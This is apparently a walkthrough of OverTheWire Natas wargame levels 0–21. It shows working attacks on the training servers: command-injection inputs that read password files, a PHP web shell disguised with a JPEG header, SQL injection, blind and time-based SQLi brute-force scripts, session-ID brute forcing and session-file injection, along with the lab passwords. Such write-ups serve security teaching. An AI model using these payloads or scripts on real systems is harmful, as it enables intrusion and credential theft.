# Natas--Over-the-wire-writeups

# level-0

link:  http://natas0.natas.labs.overthewire.org<br />
given user: natas0<br />
pass: natas0<br />

When we login with the above credentials, We can see a msg: `You can find the password for the next level on this page.`<br />
When we view the page source, we can find the password to next level.<br />
`-The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto`<br />

# Level 0 -> level 1

link:http://natas1.natas.labs.overthewire.org <br />
Given user: natas1 <br />
pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto<br />

When we login with the above credentials, we can see the message `You can find the password for the next level on this page, but rightclicking has been blocked!`.<br />
So, we will press `ctrl+u` to view the page source. There we get the password for the next level.<br />
`The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`<br />

# Level 1 -> Level 2

link:http://natas2.natas.labs.overthewire.org<br />
given user : natas2<br />
pass: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi<br />

When we login witht the above credentials, we can see the message, `there is nothing on this page.`<br />
When we view the page source we can see a file `/files/pixels.png`.<br />
When we go to the files directory, `/files/` we can see a file named `users.txt`. In that file we can see the password of the next level.<br />
`password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`<br />

# Level 2 -> Level 3

link: http://natas3.natas.labs.overthewire.org<br />
given user: natas3<br />
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br />

When we login with the credentials, we can see the message `there is nothing on this page`.<br />
When we the page source we can see a hint `No more information leaks!! Not even Google will find it this time...`<br />
From this we can understand that `robots.txt` can be used. In robots.txt we can find a disallow directory  `/s3cr3t/`.<br />
We we visit `http://natas3.natas.labs.overthewire.org/s3cr3t/`, we can see a file named `users.txt` in that directory.<br />
Opening `users.txt` gives us the password.<br />
`password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`<br />

# Level 3->level 4

link:http://natas4.natas.labs.overthewire.org/<br />
user: natas4<br />
pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ<br />

When we login with the credentials, we get a message `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`.<br />
When we open the link in burp, change the `Referer: http://natas5.natas.labs.overthewire.org/`. And the Forward this modified request.<br />
Then we can find the message: `Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`<br />
`password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`<br />


# Level 4-> Level 5

link:http://natas5.natas.labs.overthewire.org/<br />
user: natas5<br />
password:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq<br />

When we login with the above credentials, we get this message `Access disallowed. You are not logged in`<br />
When we look into the cookies in the page, we can see a cookie named `loggedin` and its `value=0`. Lets try changing the `value=1` in cookie editor and refresh the page.<br />
There we get this message : `Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`<br />
So, `password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`<br />


# Level 5-> Level 6:

Link:http://natas6.natas.labs.overthewire.org/
user: natas6
pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

When we login with these credentials, we can see a form to submit some secret code.
When we view the source page, we can see the following php code.
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
When we visit `http://natas6.natas.labs.overthewire.org/includes/secret.inc`, we get the following secret code
`secret:FOEIUWGHFEEUHOFUOIU`
When we submit the secret code, we get the message `Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
`password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`


# Level 6-> level 7:

link: http://natas7.natas.labs.overthewire.org<br />
user: natas7<br />
passw:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9<br />
When we log in with above credentials, we can see a page with `home` and `about` section. While viewing the page source, we can see a hint<br />
`hint: password for webuser natas8 is in /etc/natas_webpass/natas8`<br />
So, we click on `home`, we get the url as `http://natas7.natas.labs.overthewire.org/index.php?page=home`<br />
So, changing the url to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` will give the password<br />
`password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`<br />

# Level 7 -> Level 8:

link: http://natas8.natas.labs.overthewire.org
user: natas8
pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

When we login with the above credentials, we can see a form to submit a secret code. Viewing the source code gives the following php code.
```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
In the above php code, 3 functions are being used. `Bin2hex, strrev and base64_encoding.`
So, to find the secret code, we have to do these functions, in the reverse way, i.e `hex2bin, strrev, base64_decoding`
So in terminal,
```
php -r 'echo strrev(hex2bin("3d3d516343746d4d6d6c315669563362"));' | base64 -d

Output - oubWYf2kBq
```
So, Secret code=oubWYf2kBq
Submitting the secret code will give the password for next level.
`pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

# Level 8 -> level 9:

link:http://natas9.natas.labs.overthewire.org/
user: natas9
pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

 When we login with the above credentials, we get a page to submit something. `Find words containing: ______`
 When we view the page source code, we get the following php code.
 ```
 <?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
+ Here passthru() is used to execute external program(here grep command)
+ grep command filters the content of a file which makes our search easy.The 'grep -i' command filters output in a case-insensitive way.
+ Syntax of grep:  grep -i  'search word' 'filename'  
            here:  grep -i $key dictionary.txt
+ So, we need to find the password for level 10, it is stored in /etc/natas_webpass/natas10
+ So, in the textbox we execute the following command,
    `; cat /etc/natas_webpass/natas10`
+ We use (;) semi colon to execute multiple commands in a single line, So after submitting the above command, we get the password of level 10
+ `password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Reference:
+ Passthru(): https://www.php.net/manual/en/function.passthru.php
+ grep command: https://www.javatpoint.com/linux-grep
+ chaining commands in linux: https://www.geeksforgeeks.org/chaining-commands-in-linux/


# Level 9-> level 10

user: natas10
password:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
link:  http://natas10.natas.labs.overthewire.org

While login with the above user and pass, we can see a textbox like last time, to enter `words containing:____`. Also written that `For security reasons, we now filter on certain characters`
Checking the source code, we can see the following php code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
+ Given that `/[;|&]/` these characters cannot be present in the text we input.
+ So, we input the following payload:
  `. etc/webpass_natas/natas11` and we get the password for next level
 + `password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK `
 
 ## Reference
+ preg_match(): https://www.php.net/manual/en/function.preg-match.php

# Level 10-> level 11

user: natas11
pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
link:http://natas11.natas.labs.overthewire.org

When we login, it is written that `Cookies are protected with XOR encryption`. When we view the source code, we can see the following php code:
```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
```
+ All we want to do is to make `show password` = true, and we get the password
```
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```
+ When we checked for the cookies, we saw cookie named data with the value :ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+ Now we need to url decode this value and we get it as: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+ Now we need to json_encode the following array,
  `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")`
  For that we run the following php command,
  ```
  <?php
	echo json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
  ?>
  ```
  It gives `{"showpassword":"no","bgcolor":"#ffffff"}`
 + Next we do the xor encryption, using `{"showpassword":"no","bgcolor":"#ffffff"}` as the key.
 + So, we get `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`. ( the key is smaller than the plaintext it is repeated, so from that we can infer that the key is `qw8J`.
 + Now we json_encode `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")` and we get `{"showpassword":"yes","bgcolor":"#ffffff"}`
 + We xor encrypt the above obtained json encode with the key `qw8J` and then base64_encode it to get the following value
   `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
 + Then we change the above obtained value in the cookie and get the password
   `The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
   
   
   
 ## Level 11 -> level 12
 
 user: natas12
 pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 link:http://natas12.natas.labs.overthewire.org/
 
 When we login with the above credentials, we get a page to upload file. (Choose a JPEG to upload (max 1KB):)
 When we viewed the source code, we got the following php code
 ```
 <? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
Functions used in the code:
+ pathinfo()-    The pathinfo() function returns information about a file path.
https://www.w3schools.com/php/func_filesystem_pathinfo.asp
+ move_uploaded_file- https://www.w3schools.com/php/func_filesystem_move_uploaded_file.asp
+ About hidden type in html:https://www.w3schools.com/tags/att_input_type_hidden.asp

So, as we can see the page only accepts `.jpg` files. So, to read the password of level 13 we will write a php code and should make it run in the page. To change the file type, modify the hidden input field for filename,so that it displays a php file extension instead of jpg.
For that we run the following code in the console,<br>
`$( 'input[name="filename"]').val("test.php")` and press enter<br>
Then in a file named `natas13.php` write the following code to access the password of level 13.<br>
```
<?php
$password = shell_exec("cat /etc/natas_webpass/natas13");
echo "<pre>$password</pre>"
?>
```
Here, shell_exec() is used to execute command via shell and return the complete output as a string.<br>
When we upload the file `natas13.php`, click on the link to your file so the webserver executes the script you wrote. Then we could find our password.<br>
`The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
  
# Level 12->Level 13

user: natas13
password:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
Level 12 and 13 are kinda similar. The only difference is that the file checks for a image signature using the function `exif_imagetype()`.
Exif_imagetype():https://www.php.net/manual/en/function.exif-imagetype.php
The code looks like:
```
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) 
{
        echo "File is not an image";
}
```
Reading through the source code, we can find that there is no check for the file extension. The code reads the first bytes of the image and checks its signature.
So, we should try to fake an image signature. As it not looking for file extensions, we can upload a .php file, like last level.  So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
+ The magic number of jpg file is : FF D8 FF E0
+ So, I created a php file using the following python script:
```
>>> fh = open('shell.php','w')  
>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
>>> fh.close()  
```
+ The only code that will be executed will be that within the opening (<?) and closing (?>) PHP tags. We can start our file with anything we want.
+ Uploaded shell.php and checked the response in burp. So, once we upload the php file, we change the random-string-generated.php file to shell.php and send the request. When we do it a call is made to makeRandomPath() and it returns `\upload\random-string.php`. Now the user can go to the file and execute the following command in the url,
`URL [filename].php?cmd=cat /etc/natas_webpass/natas14`
And tus we obtain the password of next level.
pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# Level 13 -> level 14:

user: natas14
pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

When we login with the above credentials, we get a username and password form. Source code is also available
```
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```
+ First we can try giving some normal usernames and passwords, like `user: test` and `password: test`. When get a message saying `access denied`.
+ Seeing the source code, we can try for sql injection vulnerability.
+ When I gave `'` , I got the same message, `access denied!`
+ When I tried giving `"`, I got the following error
`Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
Access denied!`
+ So, this gives the probability of sql injection and try to comment out rest of the query.
+ So, when I gave ` " or 1=1 # ` we got the password.
Successful login! The password for natas15 is `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

# Level 14 -> level 15:

user: natas15
password:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

When we login with the above credentials, we get a username name field to check the existence of a username.
When I tried giving `username: guest`, it says username doesnt exist.
```
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```
+ As, we can see, we only get two outputs, `user exists` and `user doesnt exists`.
+ However, there is an SQL injection in the username field, but it’s a blind one. We only get true/false answers. So, we can try a bruteforcing technique using ython script to get the password for level 16.
+ `SELECT * from users where username="natas16" and password like binary "x%"` So, this query checks whether the password starts with x.
+ Likewise we use each and every letter and bruteforce it until we get the flag
+ Python Script:
```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"
charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()
s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```
Pass of level 16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# Level 15 -> Level 16:

user: natas16
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
When we login with the above credentials, we get a form saying `For security reasons, we now filter even more on certain characters
Find words containing: `
+ Source code is given,
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
+ This level is similar to level 10, but we have some illegal characters.
+ illegal characters: ;|&`'"
+ We have the key variable which originally sets to nothing. It will check the characters whether it is in the blacklist or not, if it passes that check it will run the command:
grep -i \”$key\” dictionary.txt
+ grep uses regular expression, let’s use regular expression character like ^ (caret) which means the first character of the string.
Let’s say ^b , if b is the first character we will not get any result. 
So, we wrote python script to solve this:
```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == 1105:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```
+ Thus, we get the password as: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

# Level 16 -> level 17:
 user: natas17
 pass: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
 + When we login with the aove credentials, we get a username field to check the existence of a username
 + source code given:
 ```
 <?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```
+ This level will not give any output, so again a sql bling injection, this time we can use time based sql injection.
+ So, the python script looks like:
```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
sqli_1 = 'natas18" AND password LIKE BINARY "'
sqli_2 = '" AND SLEEP(5)-- '

s = requests.Session()
s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        try:
            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
        except requests.Timeout:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```
Thus we obtain the password as: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

# Level 17 -> Level 18:

user: natas18
pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+ When we login with the above credentials, we get a username and password for which says `Please login with your admin account to retrieve credentials for natas19.`
+ Source code given:
```
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?>
```
+ When we login with some username and password it gives this message. `You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.`
+ So, when looked into the cookie, we can see a `phpsessionid` and for me the value was 126. 
+ So, what we want to do is, we need to bruteforce the value of phpsessionid for admin to get the password of the next level. For that we can write a simple python scipt
```
import requests

url = "http://natas18.natas.labs.overthewire.org"
url2 = "http://natas18.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
r = s.get(url)

for x in range(640):
    cookies = dict(PHPSESSID=str(x))
    r = s.get(url2, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break
	
```
When I ran the above script we got the password for the next level
pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

# Level 18 -> level 19:

user: natas19
pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+ When we login with the above credentials, we got a similar page as previous level, but it says `This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.`
+ Source code is not given.
+ When I logged in as user: admin and pass: admin, the phpsessionid looks like this `3131312d61646d696e`. This is in ascii format.
+ When I decoded the ascii, i got `111-admin`
+ I slightly changed the previous python scipt and to obtain the password of next level
```
import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for x in range(1000):
    tmp = str(x) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))

    cookies = dict(PHPSESSID=val.decode('ascii'))
    r = s.get(url, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break
```
Running the above python script gave us the password for next level.
pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

#  Level 19 -> Level 20:

user: natas20
pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+ When we login with above credentials, we get a form for entering username and it says `You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.`
+ Source code is given:
```
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```
+ There is a of my--- functions.
+source code looks like the sessions are handled by session_set_save_handler and are saved in a directory manually.
+ session_set_save_handler sets user-level session storage functions.
+ In `my-write` function,for each key/value pair in $_SESSION it "<key> <value>". SO, in a file, a mywrite function will store session variable one per line.
```
foreach($_SESSION as $key => $value) {
debug("$key => $value");
$data .= "$key $value\n";
}
```
+ In `myread` function, it takes a file and, expecting space-delimited session variables one per line, explodes it by line, and then explodes each line into two pieces by a space. 
+ SO, we need to dump the password by getting a session variable named admin and satisfy the following condition:
	`if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)`
+ Vulnerability is in `my write function`.
+ http://natas20.natas.labs.overthewire.org/index.php?debug=true&name=admin%0Aadmin%201
	The above request when send twice will get the password for the next level.
	
References:
+ https://www.php.net/manual/en/function.session-set-save-handler.php
+ Explode function: https://www.php.net/manual/en/function.explode.php
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
	
# level 20 -> 21:
Logging in with the credentials, will give a page which says:
	```
	Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
```
+ Colocated means sharing a location.
+ source code given:
	```
	<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```
+ This page check for session cookie ‘admin’ to see if you are admin or not. But we dont have an input field. 
+ THis page shows another page which was hosted on the same server.We can login to that page with the credentials we have for level 21. It is having an input field and looking at the source code it doesn't filters anything before copying the variables from $_REQUEST to $_SESSION.
+ Like last time,if we get the $_SESSION variable key to admin and its value to 1 we have won.
+ php code of the 2nd page:
```
	<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```
+This show if admin key is set to 1 in the request parameter then the session sets the admin key’s value to 1. First cookie from first site was copied to the other site so that the changes in session can be reflected on the other site.
+ So, in burp, send a post request to the second page.(note: remove the cookie header so that we will get a fresh session cookie in the response).
	`align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1`
